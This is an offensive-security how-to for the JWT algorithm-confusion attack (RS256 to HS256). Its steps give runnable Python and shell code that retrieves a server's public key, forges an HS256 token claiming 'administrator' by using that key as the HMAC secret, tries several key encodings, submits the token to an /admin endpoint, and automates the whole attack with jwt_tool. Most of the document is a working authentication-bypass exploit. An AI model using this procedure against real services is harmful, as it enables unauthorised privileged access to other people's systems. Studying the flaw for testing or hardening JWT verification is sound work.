# JWT Algorithm Confusion (RS256 → HS256)

## When this applies

- App uses an RSA-signed JWT (`alg: RS256`) and exposes the public key (commonly via JWKS endpoint or `.well-known/openid-configuration`).
- The verification library uses the algorithm specified in the TOKEN HEADER rather than enforcing the configured algorithm.
- Result: change the header to `HS256` (HMAC) and sign with the public key as the HMAC secret — server verifies against the same public key, signature passes.

## Technique

RSA verification uses the public key (anyone can have it). HMAC verification uses a shared secret. If the library asks "is this signature valid for this key?" without enforcing alg-key consistency, the public key works as both.

Forge a `HS256` token, signing with the Base64-encoded PEM of the server's public RSA key as the HMAC secret. The server's verification routine pulls the same public key, computes HMAC-SHA256 over header.payload using the public key, gets the same signature, and accepts the forged token.

## Steps

### 1. Obtain the public key

**JWKS endpoint:**
```bash
curl https://api.example.com/.well-known/jwks.json
curl https://api.example.com/.well-known/openid-configuration | jq .jwks_uri
```

**X.509 certificate:**
```bash
openssl s_client -connect api.example.com:443 < /dev/null \
  | openssl x509 -pubkey -noout > public.pem
```

**From token header (rare):**
```python
import jwt
header = jwt.get_unverified_header(token)
if 'jwk' in header:
    public_key = header['jwk']
```

### 2. Convert JWK → PEM

```python
from jwcrypto import jwk
import json, requests

resp = requests.get('https://api.example.com/jwks.json').json()
public_jwk = resp['keys'][0]
key = jwk.JWK(**public_jwk)
public_pem = key.export_to_pem()
```

### 3. Forge an HS256 token using PEM as secret

```python
import jwt

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "administrator", "exp": 9999999999}
token = jwt.encode(payload, public_pem, algorithm='HS256', headers=header)
```

### 4. Try multiple secret encodings

If the first attempt fails, the server may consume the key in a different form:

```python
# Option 1: Use PEM directly (most common)
secret = public_pem

# Option 2: Base64-encoded PEM
secret = base64.b64encode(public_pem)

# Option 3: Raw modulus
from cryptography.hazmat.primitives.serialization import load_pem_public_key
key = load_pem_public_key(public_pem)
n = key.public_numbers().n
secret = n.to_bytes((n.bit_length() + 7) // 8, 'big')

# Option 4: Use entire JWK dict as JSON string
secret = json.dumps(public_jwk).encode()

# Option 5: Use modulus from JWK directly
n_bytes = base64.urlsafe_b64decode(public_jwk['n'] + '==')
secret = n_bytes
```

Each library serializes the public key differently before HMAC. Try all forms.

### 5. Submit forged token

```python
import requests
r = requests.get('https://api.example.com/admin',
                 headers={'Authorization': f'Bearer {token}'})
print(r.status_code, r.text)
```

### 6. jwt_tool automation

```bash
# Save public key to disk first
curl https://api.example.com/jwks.json > jwks.json
# Convert to PEM (jwks-converter or manual)

# Run attack
python3 jwt_tool.py JWT -X k -pk public.pem -pc sub -pv admin
```

`-X k` is the algorithm-confusion attack; `-pk` is the public key; `-pc/-pv` set claim/value.

### 7. Variations

**Algorithm aliases:** if `HS256` is filtered/normalized, try:
```json
{"alg": "HS384"}     // HMAC-SHA384
{"alg": "HS512"}     // HMAC-SHA512
```

Different alg name, same fundamental confusion.

**Downgrade variants:**
```json
// Original RS512 → forge as RS256 (different RSA hash)
{"alg": "RS256"}    // when original was RS512

// EC variants
{"alg": "ES256K"}   // different curve
```

## Verifying success

- Forged token returns 200 from `/admin` or any privileged endpoint.
- The token decodes (at jwt.io) showing the modified payload.
- Original (legitimate) tokens still work — confirms you didn't break the auth flow, just bypassed it.

## Common pitfalls

- Modern libraries enforce algorithm-key consistency. PyJWT ≥ 2.0 raises `InvalidAlgorithmError` when key type doesn't match `algorithms` parameter.
- Some servers cache the public key and reject any token without the expected `kid` — match the original `kid` in your forged header.
- Trailing newlines / whitespace in the PEM matter. `key.export_to_pem()` includes a final `\n` — copy exactly.
- `n` in JWK is Base64URL-encoded with possibly missing padding (`==`). Pad correctly before decoding.
- Check that the original token actually uses RS256 — `alg: HS256` already means HMAC, no confusion to exploit.

## Tools

- jwt_tool (`-X k -pk public.pem`).
- Burp Suite JWT Editor: paste JWK → export PEM → New Symmetric Key with PEM as `k` → sign HS256.
- Custom Python with PyJWT + jwcrypto.
- jwt.io for decoding & verification testing.
